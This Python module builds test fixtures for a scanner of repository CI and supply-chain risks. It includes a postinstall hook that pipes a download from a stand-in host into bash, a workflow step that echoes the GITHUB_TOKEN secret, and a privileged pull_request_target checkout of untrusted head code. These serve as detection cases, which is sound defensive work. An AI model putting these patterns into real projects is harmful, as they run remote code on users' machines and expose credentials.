"""`ci_surface` fixture builders (task 3.6, `ARCHITECTURE.md` 9.6).

Each builder is named after the rule it proves, as `project_structure.md` 5 requires. Trigger text
is assembled from fragments at test time, so no committed file in this repository reads as a working
dropper or a secret dump (`AGENTS.md` 4), and a negative case is a near miss of its own rule rather
than an empty file: an empty workflow proves nothing about a rule that reads YAML.

The paths matter more here than anywhere else in the suite. These rules run on roles that come from
`rules/roles.toml`, so a builder that filed its workflow under `src/example.yml` would resolve to
`source`, claim none of them, and pass by matching nothing.
"""

from __future__ import annotations

from . import Case, File, Fixture, assemble

WORKFLOW_PATH = ".github/workflows/release.yml"
MANIFEST_PATH = "package.json"
SETTINGS_PATH = ".vscode/settings.json"

TRIGGER = assemble("pull_request_", "target")
HEAD_REF = assemble("ref: ${{ github.event.pull", "_request.head.sha }}")
CHECKOUT = assemble("uses: actions/checkout@", "v4")
INTERP = "${{ " + assemble("secrets", ".GITHUB_TOKEN }}")
CLIENT = assemble("cu", "rl")
SHELL = assemble("ba", "sh")

#: The fetch on its own, and the same fetch with a shell on the other side of the pipe.
FETCH_ONLY = f"{CLIENT} -sL https://example.invalid/versions.json -o versions.json"
FETCH_AND_RUN = f"{CLIENT} -sL https://example.invalid/x.sh | {SHELL}"


def _workflow(*lines: str) -> Case:
    return Case(files=(File(WORKFLOW_PATH, text="\n".join(lines) + "\n"),))


def _manifest(*entries: str) -> Case:
    body = ",\n".join(f"    {entry}" for entry in entries)
    return Case(files=(File(MANIFEST_PATH, text=f'{{\n  "scripts": {{\n{body}\n  }}\n}}\n'),))


def _settings(*lines: str) -> Case:
    return Case(files=(File(SETTINGS_PATH, text="\n".join(lines) + "\n"),))


def ci_privileged_trigger() -> Fixture:
    return Fixture(
        positive=_workflow(
            "on:",
            f"  {TRIGGER}:",
            "    types: [closed]",
            "jobs:",
            "  changelog:",
            "    steps: []",
        ),
        # `pull_request` is the same word without the privileged half: the code checked out is the
        # contributor's branch in a read-only context, which is what a normal CI job is for.
        negative=_workflow(
            "on:",
            "  pull_request:",
            "    branches: [main]",
            "jobs:",
            "  changelog:",
            "    steps: []",
        ),
    )


def ci_secret_dump() -> Fixture:
    return Fixture(
        positive=_workflow(
            "jobs:",
            "  publish:",
            "    steps:",
            f'      - run: echo "token {INTERP}"',
        ),
        # The credential handed to an action's input is how a workflow uses a secret. Nothing here
        # prints it or stores it where a later step can read it, so the same interpolation is clean.
        negative=_workflow(
            "jobs:",
            "  publish:",
            "    steps:",
            f"      - {CHECKOUT}",
            "        with:",
            f"          token: {INTERP}",
        ),
    )


def ci_ptr_head_checkout() -> Fixture:
    return Fixture(
        positive=_workflow(
            "on:",
            f"  {TRIGGER}:",
            "jobs:",
            "  build:",
            "    steps:",
            f"      - {CHECKOUT}",
            "        with:",
            f"          {HEAD_REF}",
        ),
        # The safe form of the same workflow: a privileged trigger and an ordinary checkout of the
        # base, which is the shape every comment bot wants reviewed as clean rather than silenced.
        negative=_workflow(
            "on:",
            f"  {TRIGGER}:",
            "jobs:",
            "  build:",
            "    steps:",
            f"      - {CHECKOUT}",
            "        with:",
            "          ref: refs/heads/main",
        ),
    )


def ci_lifecycle_fetch() -> Fixture:
    return Fixture(
        positive=_manifest(f'"postinstall": "{FETCH_ONLY}"'),
        # A lifecycle script that names a build tool the repository already holds. The hook rule
        # reads the same roles, so the negative is the ordinary case rather than an absent file.
        negative=_manifest('"postinstall": "npm run build"'),
    )


def ci_lifecycle_exec() -> Fixture:
    return Fixture(
        positive=_manifest(f'"postinstall": "{FETCH_AND_RUN}"'),
        # The same line with no shell on the other end of the pipe stays the WARN above, which is
        # the point of splitting the two: the handover, not the fetch, is what fails a build.
        negative=_manifest(f'"postinstall": "{FETCH_ONLY}"'),
    )


def ci_editor_command_path() -> Fixture:
    return Fixture(
        positive=_settings("{", '  "python.defaultInterpreterPath": "./tools/python",', "}"),
        negative=_settings("{", '  "editor.formatOnSave": true,', '  "editor.tabSize": 2', "}"),
    )


BUILDERS = {
    "ci_privileged_trigger": ci_privileged_trigger,
    "ci_secret_dump": ci_secret_dump,
    "ci_ptr_head_checkout": ci_ptr_head_checkout,
    "ci_lifecycle_fetch": ci_lifecycle_fetch,
    "ci_lifecycle_exec": ci_lifecycle_exec,
    "ci_editor_command_path": ci_editor_command_path,
}
